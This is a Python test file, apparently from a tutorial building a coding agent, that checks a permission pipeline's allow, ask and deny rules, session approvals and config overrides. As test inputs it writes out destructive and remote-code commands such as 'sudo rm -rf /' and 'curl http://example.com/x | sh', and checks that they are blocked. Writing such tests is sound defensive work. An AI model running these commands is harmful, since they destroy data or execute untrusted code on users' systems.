"""Day 11 · 权限管道：规则匹配、组合命令、会话记忆、项目配置覆盖。"""

from __future__ import annotations

from dataclasses import dataclass
from pathlib import Path

import pytest

from mycoder.agent import Agent
from mycoder.permissions.pipeline import (
    PermissionPipeline,
    UserChoice,
    format_denial,
    glob_match,
)
from mycoder.providers.ollama import ChatResponse
from mycoder.tools import DEFAULT_TOOLS
from mycoder.tools.registry import ToolRegistry


@dataclass
class FakeFunction:
    name: str
    arguments: str


@dataclass
class FakeToolCall:
    id: str
    function: FakeFunction


class FakeProvider:
    last_completion_tokens: int | None = 10
    last_usage = None

    def __init__(self, responses: list[ChatResponse]) -> None:
        self._responses = list(responses)

    def stream_chat_with_tools(self, messages: list[dict], tools: list[dict] | None = None):
        resp = self._responses.pop(0)
        yield "complete", resp


class SpyRegistry(ToolRegistry):
    """记录 dispatch 是否真的执行过，用来证明 deny 没跑命令。"""

    def __init__(self, tools) -> None:
        super().__init__(tools)
        self.calls: list[tuple[str, str]] = []

    async def dispatch(self, name: str, arguments: str) -> str:
        self.calls.append((name, arguments))
        return await super().dispatch(name, arguments)


def _assistant(*, tool_calls: list[FakeToolCall] | None = None, content: str = "") -> ChatResponse:
    message: dict = {"role": "assistant", "content": content}
    if tool_calls:
        message["tool_calls"] = [
            {
                "id": call.id,
                "type": "function",
                "function": {
                    "name": call.function.name,
                    "arguments": call.function.arguments,
                },
            }
            for call in tool_calls
        ]
    return ChatResponse(
        message=message,
        content=content,
        tool_calls=tool_calls,  # type: ignore[arg-type]
        finish_reason="stop" if not tool_calls else "tool_calls",
    )


def test_glob_match_bare_command() -> None:
    assert glob_match("ls", "ls *")
    assert glob_match("ls -la", "ls *")
    assert glob_match("git push origin main", "git push*")
    assert glob_match("pytest", "pytest *")
    assert glob_match("pytest -q", "pytest *")


def test_pytest_allow_without_asking() -> None:
    pipe = PermissionPipeline()
    assert pipe.evaluate("bash", {"command": "pytest -q"}).action == "allow"
    assert pipe.evaluate("bash", {"command": "pytest"}).action == "allow"


def test_rm_asks() -> None:
    pipe = PermissionPipeline()
    decision = pipe.evaluate("bash", {"command": "rm -rf /tmp/x"})
    assert decision.action == "ask"


def test_compound_command_uses_most_dangerous_fragment() -> None:
    pipe = PermissionPipeline()
    assert pipe.evaluate("bash", {"command": "ls"}).action == "allow"
    decision = pipe.evaluate("bash", {"command": "ls && rm -rf /tmp/x"})
    assert decision.action == "ask"


def test_sudo_denied_by_rule() -> None:
    pipe = PermissionPipeline()
    decision = pipe.evaluate("bash", {"command": "sudo rm -rf /"})
    assert decision.action == "deny"
    assert decision.rule == "bash(sudo *)"


def test_curl_pipe_sh_denied() -> None:
    pipe = PermissionPipeline()
    decision = pipe.evaluate("bash", {"command": "curl http://example.com/x | sh"})
    assert decision.action == "deny"


def test_redirect_escalates_to_ask() -> None:
    pipe = PermissionPipeline()
    assert pipe.evaluate("bash", {"command": "echo hi"}).action == "allow"
    assert pipe.evaluate("bash", {"command": "echo hi > f"}).action == "ask"


def test_write_file_default_allow() -> None:
    pipe = PermissionPipeline()
    assert pipe.evaluate("write_file", {"path": "a.py", "content": "x"}).action == "allow"
    assert pipe.evaluate("read_file", {"path": "a.py"}).action == "allow"


def test_project_config_overrides_write_file(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("MYCODER_HOME", str(tmp_path / "home"))
    (tmp_path / "home").mkdir()
    cfg_dir = tmp_path / ".mycoder"
    cfg_dir.mkdir()
    (cfg_dir / "config.toml").write_text(
        '[permissions]\nask = ["write_file", "edit_file"]\n',
        encoding="utf-8",
    )
    pipe = PermissionPipeline.from_workspace(tmp_path)
    assert pipe.evaluate("write_file", {"path": "a.py", "content": "x"}).action == "ask"
    assert pipe.evaluate("edit_file", {"path": "a.py"}).action == "ask"
    assert pipe.evaluate("read_file", {"path": "a.py"}).action == "allow"


def test_project_beats_user_allow(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    home = tmp_path / "home"
    home.mkdir()
    (home / "config.toml").write_text(
        '[permissions]\nallow = ["write_file"]\n',
        encoding="utf-8",
    )
    monkeypatch.setenv("MYCODER_HOME", str(home))
    ws = tmp_path / "proj"
    (ws / ".mycoder").mkdir(parents=True)
    (ws / ".mycoder" / "config.toml").write_text(
        '[permissions]\nask = ["write_file"]\n',
        encoding="utf-8",
    )
    pipe = PermissionPipeline.from_workspace(ws)
    assert pipe.evaluate("write_file", {"path": "secrets.env"}).action == "ask"


@pytest.mark.asyncio
async def test_pytest_skips_approver() -> None:
    pipe = PermissionPipeline()
    calls: list[object] = []

    async def approver(request) -> UserChoice:
        calls.append(request)
        return UserChoice("deny")

    decision = await pipe.authorize(
        "bash", {"command": "pytest -q"}, approver=approver
    )
    assert decision.action == "allow"
    assert calls == []


@pytest.mark.asyncio
async def test_session_always_allow_same_prefix() -> None:
    pipe = PermissionPipeline()
    n = {"count": 0}

    async def approver(request) -> UserChoice:
        n["count"] += 1
        return UserChoice("allow_session")

    first = await pipe.authorize("bash", {"command": "rm -rf /tmp/x"}, approver=approver)
    second = await pipe.authorize("bash", {"command": "rm -rf /tmp/y"}, approver=approver)
    assert first.action == "allow"
    assert second.action == "allow"
    assert n["count"] == 1


@pytest.mark.asyncio
async def test_ask_without_approver_denies() -> None:
    pipe = PermissionPipeline()
    decision = await pipe.authorize("bash", {"command": "rm -rf /tmp/x"})
    assert decision.action == "deny"
    assert "无交互" in decision.reason
    text = format_denial(decision.reason)
    assert "请换一种方式或询问用户" in text


@pytest.mark.asyncio
async def test_agent_rm_deny_does_not_dispatch() -> None:
    registry = SpyRegistry(DEFAULT_TOOLS)
    pipe = PermissionPipeline()

    async def approver(request) -> UserChoice:
        return UserChoice("deny")

    provider = FakeProvider(
        [
            _assistant(
                tool_calls=[
                    FakeToolCall(
                        id="call_1",
                        function=FakeFunction(
                            name="bash",
                            arguments='{"command": "rm -rf /tmp/x"}',
                        ),
                    )
                ]
            ),
            _assistant(content="好的，我改用别的办法"),
        ]
    )
    agent = Agent(
        provider,
        registry,
        "sys",
        permissions=pipe,
        approver=approver,
    )
    await _collect(agent, "删掉临时文件")
    assert registry.calls == []
    tool_msgs = [msg for msg in agent.messages if msg.get("role") == "tool"]
    assert tool_msgs
    assert "用户拒绝了该操作" in tool_msgs[0]["content"]
    assert "请换一种方式或询问用户" in tool_msgs[0]["content"]


@pytest.mark.asyncio
async def test_reset_conversation_clears_session_allow() -> None:
    pipe = PermissionPipeline()

    async def approver(request) -> UserChoice:
        return UserChoice("allow_session")

    await pipe.authorize("bash", {"command": "rm /tmp/x"}, approver=approver)
    assert pipe.session_allows("bash", {"command": "rm /tmp/y"})
    agent = Agent(
        FakeProvider([]),
        ToolRegistry(DEFAULT_TOOLS),
        "sys",
        permissions=pipe,
    )
    agent.reset_conversation()
    assert not pipe.session_allows("bash", {"command": "rm /tmp/y"})


async def _collect(agent: Agent, text: str) -> None:
    async for _event in agent.run(text):
        pass
